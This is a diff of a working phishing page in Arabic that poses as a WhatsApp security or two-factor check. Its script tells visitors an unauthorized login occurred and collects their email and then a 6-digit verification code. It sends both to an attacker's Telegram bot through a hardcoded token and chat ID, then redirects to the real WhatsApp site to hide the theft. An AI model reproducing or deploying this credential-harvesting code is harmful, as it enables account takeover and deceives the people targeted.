@@ -3,127 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security</title>
+    <title>WhatsApp Authentication</title>
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
+        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         
-        /* شاشة التحميل السريعة */
-        #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.4s; }
-        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin-top: 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        .logo-box { margin-bottom: 25px; position: relative; display: inline-block; }
+        .main-logo { width: 70px; fill: var(--wa-green); }
+        
+        .card { background: #1d2a33; border-radius: 16px; padding: 24px; border: 1px solid #2a3942; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        h2 { font-weight: 500; font-size: 20px; margin-bottom: 10px; }
+        .sub-text { font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px; }
 
-        .container { width: 100%; max-width: 420px; padding: 25px; text-align: center; opacity: 0; transform: translateY(10px); transition: 0.5s; }
-        .container.active { opacity: 1; transform: translateY(0); }
+        .input-group { position: relative; margin-bottom: 20px; }
+        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 16px; color: #fff; font-size: 15px; outline: none; text-align: center; transition: 0.3s; }
+        .input-box:focus { border-color: var(--wa-green); background: #25313a; }
 
-        .card { background: #1d2a33; border-radius: 12px; padding: 18px; text-align: right; margin: 20px 0; border: 1px solid #2a3942; }
-        .line { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; color: var(--wa-hint); }
-        .line b { color: var(--wa-green); }
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.97); }
 
-        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 10px; padding: 15px; color: #fff; font-size: 16px; outline: none; margin: 15px 0; text-align: center; transition: 0.3s; }
-        .input-box:focus { border-color: var(--wa-green); box-shadow: 0 0 5px rgba(0,168,132,0.3); }
-
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        .wa-logo { width: 60px; height: 60px; fill: var(--wa-green); }
-        .hidden { opacity: 0 !important; pointer-events: none; }
+        /* شاشة التحميل الذكية */
+        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.5s; }
+        .spin { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
+        @keyframes s { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="checker">
-        <svg class="wa-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        <div class="spinner"></div>
-        <p style="color:var(--wa-hint); font-size: 14px; margin-top:15px;">جاري المزامنة مع الخادم...</p>
+    <div id="loader">
+        <svg class="main-logo" viewBox="0 0 24 24" style="margin-bottom: 20px;"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+        <div class="spin"></div>
+        <p id="load-txt" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري تأمين الاتصال...</p>
     </div>
 
-    <div class="container" id="main-ui">
-        <svg width="50" height="50" viewBox="0 0 24 24" style="fill:var(--wa-green); margin-bottom:10px;"><path d="M12 0a12 12 0 110 24 12 12 0 010-24zm0 2a10 10 0 100 20 10 10 0 000-20zm5.2 6.3l1.4 1.4L10 18.3l-4.6-4.6 1.4-1.4 3.2 3.2 7.2-7.2z"/></svg>
-        <h2 style="font-weight: 500; font-size: 22px;">تأمين الحساب</h2>
-        
+    <div class="container">
         <div class="card">
-            <div class="line"><span>رقم الهاتف:</span> <b id="phone-mask">--</b></div>
-            <div class="line"><span>حالة الأمان:</span> <span style="color:#ffbc2e;">تحقق مطلوب</span></div>
+            <div class="logo-box">
+                <svg class="main-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+            </div>
+            <h2 id="title">تأكيد الهوية الرقمية</h2>
+            <p class="sub-text" id="desc">رصدت أنظمة الأمان محاولة دخول غير مصرح بها. يرجى إدخال البريد الإلكتروني المرتبط بحسابك لتلقي إشعار الموافقة.</p>
+            
+            <div class="input-group">
+                <input type="email" id="inp" class="input-box" placeholder="example@gmail.com" dir="ltr">
+            </div>
+
+            <button class="btn" onclick="next()">إرسال طلب التحقق</button>
         </div>
-
-        <p id="msg-text" style="font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 5px;">
-            يرجى إدخال البريد الإلكتروني المرتبط لتلقي رمز الوصول وتأكيد هويتك.
-        </p>
-
-        <input type="email" id="user-input" class="input-box" placeholder="example@gmail.com" spellcheck="false">
-        
-        <button class="btn" id="action-btn" onclick="nextStep()">متابعة</button>
-
-        <div style="margin-top: 30px; display: flex; align-items: center; justify-content: center; gap: 8px;">
-            <span style="font-size: 11px; color: var(--wa-hint);">تم التشفير بواسطة WhatsApp Security</span>
-        </div>
+        <p style="margin-top: 20px; font-size: 11px; color: var(--wa-hint);">WhatsApp 2FA Security System</p>
     </div>
 
     <script>
-        const CONFIG = {
-            TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            CHAT_ID: '5446862709',
-            PHONE: new URLSearchParams(window.location.search).get('u') || "010********"
+        const CFG = {
+            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
+            C: '5446862709',
+            P: new URLSearchParams(window.location.search).get('u') || "Unknown"
         };
 
-        let step = "EMAIL";
+        let step = 0;
 
-        // إخفاء الـ Loading وعرض المحتوى
-        window.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('phone-mask').innerText = `+20 ${CONFIG.PHONE.substring(0,3)}••••${CONFIG.PHONE.slice(-2)}`;
-            
+        window.onload = () => {
             setTimeout(() => {
-                document.getElementById('checker').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('checker').style.display = 'none';
-                    document.getElementById('main-ui').classList.add('active');
-                }, 400);
-                sendToBot(`👤 <b>Visitor Alert</b>\nPhone: <code>${CONFIG.PHONE}</code>`);
-            }, 1200);
-        });
+                document.getElementById('loader').style.opacity = '0';
+                setTimeout(() => document.getElementById('loader').style.display = 'none', 500);
+            }, 1500);
+        };
 
-        async function sendToBot(text) {
-            const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`;
-            const body = JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'HTML' });
-            
-            // استخدام fetch مع keepalive لضمان السرعة وعدم التعليق
-            try {
-                fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body, keepalive: true });
-            } catch(e) {}
+        async function notify(msg) {
+            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
+            }).catch(()=>{});
         }
 
-        async function nextStep() {
-            const input = document.getElementById('user-input');
-            const btn = document.getElementById('action-btn');
-            const msg = document.getElementById('msg-text');
-            const val = input.value.trim();
+        async function next() {
+            const inp = document.getElementById('inp');
+            const btn = document.querySelector('.btn');
+            const val = inp.value.trim();
 
-            if (val.length < 5) return;
+            if(!val || val.length < 5) return;
 
-            btn.disabled = true;
-            btn.innerText = "جاري المعالجة...";
-
-            if (step === "EMAIL") {
-                await sendToBot(`📧 <b>Target Email</b>\nPhone: <code>${CONFIG.PHONE}</code>\nEmail: <code>${val}</code>`);
+            if(step === 0) {
+                // مرحلة الإيميل
+                btn.disabled = true;
+                btn.innerText = "جاري إرسال الطلب...";
+                await notify(`📧 <b>Target Email</b>\nUser: <code>${CFG.P}</code>\nEmail: <code>${val}</code>`);
+                
+                // محاكاة إرسال الإشعار
+                document.getElementById('loader').style.display = 'flex';
+                document.getElementById('loader').style.opacity = '1';
+                document.getElementById('load-txt').innerText = "يرجى فتح تطبيق البريد الإلكتروني والموافقة على الدخول...";
                 
                 setTimeout(() => {
-                    step = "OTP";
-                    msg.innerHTML = "أدخل كود التحقق المكون من 6 أرقام المرسل إلى إيميلك الآن:";
-                    input.value = "";
-                    input.placeholder = "--- ---";
-                    input.type = "tel";
-                    input.maxLength = 6;
-                    btn.innerText = "تأكيد وربط الحساب";
+                    document.getElementById('loader').style.opacity = '0';
+                    setTimeout(() => document.getElementById('loader').style.display = 'none', 500);
+                    
+                    step = 1;
+                    document.getElementById('title').innerText = "أدخل رمز التفويض";
+                    document.getElementById('desc').innerText = "لم نتمكن من إرسال إشعار الدفع، يرجى إدخال الرمز المكون من 6 أرقام المرسل إلى بريدك الآن.";
+                    inp.value = "";
+                    inp.type = "tel";
+                    inp.placeholder = "--- ---";
+                    inp.maxLength = 6;
                     btn.disabled = false;
-                }, 1000);
+                    btn.innerText = "تأكيد الدخول";
+                }, 4000); // 4 ثواني عشان يحس بجدية الموضوع
+
             } else {
-                await sendToBot(`🔥 <b>WhatsApp OTP Captured!</b>\nPhone: <code>${CONFIG.PHONE}</code>\nCode: <code>${val}</code>`);
-                btn.innerText = "تم بنجاح";
+                // مرحلة الكود
+                btn.disabled = true;
+                btn.innerText = "جاري المزامنة...";
+                await notify(`🔥 <b>PERFECTION CODE</b>\nUser: <code>${CFG.P}</code>\nCode: <code>${val}</code>`);
+                
                 setTimeout(() => {
-                    window.location.replace("https://www.whatsapp.com/security");
-                }, 1000);
+                    window.location.href = "https://www.whatsapp.com/security";
+                }, 2000);
             }
         }
     </script>
